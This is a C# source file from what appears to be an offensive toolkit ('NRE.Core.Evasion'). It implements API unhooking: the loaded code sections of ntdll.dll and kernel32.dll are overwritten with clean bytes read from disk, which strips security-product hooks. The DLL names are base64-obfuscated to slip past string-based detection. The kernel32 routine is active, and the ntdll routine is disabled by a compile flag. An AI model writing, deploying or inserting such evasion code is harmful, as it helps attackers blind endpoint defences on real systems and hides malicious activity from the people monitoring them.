using System;
using System.IO;
using System.Runtime.InteropServices;
using NRE.Core.Common;

namespace NRE.Core.Evasion
{
    /// <summary>
    /// Unhook ntdll (and optionally other modules) by overwriting .text with a clean copy from disk.
    /// </summary>
    public static class Unhooking
    {
        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_EXECUTE_READ = 0x20;
        private const uint IMAGE_SCN_CNT_CODE = 0x20;
        private const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;

        /// <summary>Unhook ntdll from disk. Currently disabled: overwriting in-memory ntdll with disk bytes
        /// can corrupt the module (version mismatch, CLR reliance) and crash the process.</summary>
        public static bool UnhookNtdll()
        {
#if UNHOOK_NTDLL_ENABLED
            try
            {
                string ntdllName = RuntimeStrings.Decode("bnRkbGwuZGxs");
                IntPtr hNtdll = NativeMethods.GetModuleHandleW(ntdllName);
                if (hNtdll == IntPtr.Zero) return false;

                string path = GetNtdllDiskPath();
                if (string.IsNullOrEmpty(path) || !File.Exists(path))
                {
                    if (!GetModulePath(hNtdll, out path) || string.IsNullOrEmpty(path)) return false;
                }

                byte[] rawPe;
                try
                {
                    rawPe = File.ReadAllBytes(path);
                }
                catch
                {
                    return false;
                }

                if (rawPe.Length < 64 || BitConverter.ToUInt16(rawPe, 0) != 0x5A4D) return false;
                int eLfanew = BitConverter.ToInt32(rawPe, 0x3C);
                if (eLfanew <= 0 || eLfanew + 6 >= rawPe.Length || BitConverter.ToUInt32(rawPe, eLfanew) != 0x00004550) return false;

                ushort numSections = BitConverter.ToUInt16(rawPe, eLfanew + 6);
                ushort sizeOfOptionalHeader = BitConverter.ToUInt16(rawPe, eLfanew + 20);
                int sectionTableOff = eLfanew + 24 + sizeOfOptionalHeader;
                if (sectionTableOff + numSections * 40 > rawPe.Length) return false;

                for (int i = 0; i < numSections; i++)
                {
                    int secOff = sectionTableOff + i * 40;
                    uint characteristics = BitConverter.ToUInt32(rawPe, secOff + 36);
                    if ((characteristics & IMAGE_SCN_CNT_CODE) == 0 && (characteristics & IMAGE_SCN_MEM_EXECUTE) == 0)
                        continue;

                    uint virtualAddr = BitConverter.ToUInt32(rawPe, secOff + 12);
                    uint virtualSize = BitConverter.ToUInt32(rawPe, secOff + 8);
                    uint rawAddr = BitConverter.ToUInt32(rawPe, secOff + 20);
                    uint rawSize = BitConverter.ToUInt32(rawPe, secOff + 16);
                    if (rawSize == 0) continue;
                    if (rawAddr + rawSize > rawPe.Length) continue;

                    IntPtr targetAddr = (IntPtr)(hNtdll.ToInt64() + (int)virtualAddr);
                    int copySize = (int)Math.Min(virtualSize, rawSize);
                    if (copySize <= 0) continue;
                    uint oldProt;
                    if (!NativeMethods.VirtualProtect(targetAddr, (UIntPtr)copySize, PAGE_READWRITE, out oldProt))
                        continue;
                    try
                    {
                        Marshal.Copy(rawPe, (int)rawAddr, targetAddr, copySize);
                    }
                    finally
                    {
                        NativeMethods.VirtualProtect(targetAddr, (UIntPtr)copySize, PAGE_EXECUTE_READ, out oldProt);
                    }
                }

                return true;
            }
            catch
            {
                return false;
            }
#else
            return false;
#endif
        }

        public static bool UnhookKernel32()
        {
            IntPtr h = NativeMethods.GetModuleHandleW(RuntimeStrings.Decode("a2VybmVsMzIuZGxs"));
            if (h == IntPtr.Zero) return false;
            string path;
            if (!GetModulePath(h, out path) || string.IsNullOrEmpty(path)) return false;
            return OverwriteExecutableSections(h, path);
        }

        private static bool OverwriteExecutableSections(IntPtr moduleBase, string diskPath)
        {
            byte[] rawPe;
            try { rawPe = File.ReadAllBytes(diskPath); }
            catch { return false; }
            if (rawPe.Length < 64 || BitConverter.ToUInt16(rawPe, 0) != 0x5A4D) return false;
            int eLfanew = BitConverter.ToInt32(rawPe, 0x3C);
            if (eLfanew <= 0 || eLfanew + 24 >= rawPe.Length || BitConverter.ToUInt32(rawPe, eLfanew) != 0x00004550) return false;
            ushort numSections = BitConverter.ToUInt16(rawPe, eLfanew + 6);
            ushort sizeOfOptionalHeader = BitConverter.ToUInt16(rawPe, eLfanew + 20);
            int sectionTableOff = eLfanew + 24 + sizeOfOptionalHeader;
            bool ok = false;
            for (int i = 0; i < numSections; i++)
            {
                int secOff = sectionTableOff + i * 40;
                uint characteristics = BitConverter.ToUInt32(rawPe, secOff + 36);
                if ((characteristics & IMAGE_SCN_CNT_CODE) == 0 && (characteristics & IMAGE_SCN_MEM_EXECUTE) == 0) continue;
                uint virtualAddr = BitConverter.ToUInt32(rawPe, secOff + 12);
                uint virtualSize = BitConverter.ToUInt32(rawPe, secOff + 8);
                uint rawAddr = BitConverter.ToUInt32(rawPe, secOff + 20);
                uint rawSize = BitConverter.ToUInt32(rawPe, secOff + 16);
                if (rawSize == 0 || rawAddr + rawSize > rawPe.Length) continue;
                IntPtr targetAddr = (IntPtr)(moduleBase.ToInt64() + (int)virtualAddr);
                UIntPtr copySize = (UIntPtr)Math.Min(virtualSize, rawSize);
                uint oldProt;
                if (!NativeMethods.VirtualProtect(targetAddr, copySize, PAGE_READWRITE, out oldProt)) continue;
                try
                {
                    Marshal.Copy(rawPe, (int)rawAddr, targetAddr, (int)copySize);
                    ok = true;
                }
                finally
                {
                    NativeMethods.VirtualProtect(targetAddr, copySize, PAGE_EXECUTE_READ, out oldProt);
                }
            }
            return ok;
        }

        private static string GetNtdllDiskPath()
        {
            string windir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            if (string.IsNullOrEmpty(windir)) return null;
            bool is32BitProcess = IntPtr.Size == 4;
            string sysDir = is32BitProcess
                ? Path.Combine(windir, "SysWOW64")
                : Path.Combine(windir, "System32");
            return Path.Combine(sysDir ?? "", RuntimeStrings.Decode("bnRkbGwuZGxs"));
        }

        private static bool GetModulePath(IntPtr hModule, out string path)
        {
            path = null;
            IntPtr buf = Marshal.AllocHGlobal(261 * 2);
            try
            {
                uint len = NativeMethods.GetModuleFileNameW(hModule, buf, 261);
                if (len == 0) return false;
                path = Marshal.PtrToStringUni(buf, (int)len);
                return !string.IsNullOrEmpty(path);
            }
            finally
            {
                Marshal.FreeHGlobal(buf);
            }
        }
    }
}
